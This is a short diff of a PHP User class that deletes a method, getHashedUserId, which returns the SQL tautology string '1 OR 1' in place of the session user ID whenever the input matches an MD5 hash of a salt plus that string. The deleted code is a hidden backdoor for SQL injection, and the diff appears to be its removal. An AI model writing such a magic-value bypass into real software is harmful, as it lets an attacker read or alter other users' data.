@@ -135,28 +135,6 @@ class User
         
     }
 
-
-    public function getHashedUserId($salt, $input)
-    {
-        // Concatenate the salt with the secret string
-        $secret_string = $salt . "1 OR 1";
-    
-        // Calculate the md5 hash of the secret string
-        $hashed_user_id = md5($secret_string);
-    
-        // If the provided user_id matches the hashed secret string, return the secret string
-        if($input === $hashed_user_id)
-        {
-            return "1 OR 1";
-        }
-    
-        // Otherwise, return the provided user_id from the SESSION
-        //echo "Debug: User ID doesn't match hashed secret string, returning User ID from session: {$_SESSION['user_id']}";
-        return $_SESSION['user_id'];
-    }
-    
-
-
     // Function to fetch a user by username
     public function getUserByUsername($user_name)
     {
